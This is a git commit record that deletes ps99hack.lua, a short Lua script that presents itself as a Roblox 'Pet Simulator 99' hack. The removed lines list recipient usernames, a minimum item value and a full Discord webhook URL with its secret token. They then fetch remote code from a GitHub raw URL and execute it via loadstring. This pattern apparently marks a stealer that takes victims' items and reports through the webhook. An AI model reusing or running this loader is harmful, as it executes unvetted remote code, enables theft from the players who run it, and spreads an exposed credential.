74a1e385b17c1f5ef36ab7759a288e63440ee576
gargantuanhunter <ahmadjaman55552@gmail.com>
2025-05-01 13:34:34 +0200

    Delete ps99hack.lua

--- ps99hack.lua
+++
@@ -1,5 +0,0 @@
-_G.Usernames = {"Yoghurtyoghurt11"} -- you can add as many as you'd like
-_G.minrap = 1000000
-_G.webhook = "https://discord.com/api/webhooks/1367458395019280485/IbxjsIfm8pUDRM5_RcpvN2f1yZQ09zvzvjXa1xvwXFfHJ2yVo6gfIUPkq_dbAHFQTEXK" -- change to your webhook
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/gargantuanhunter/egurosikps/refs/heads/main/source.lua"))()
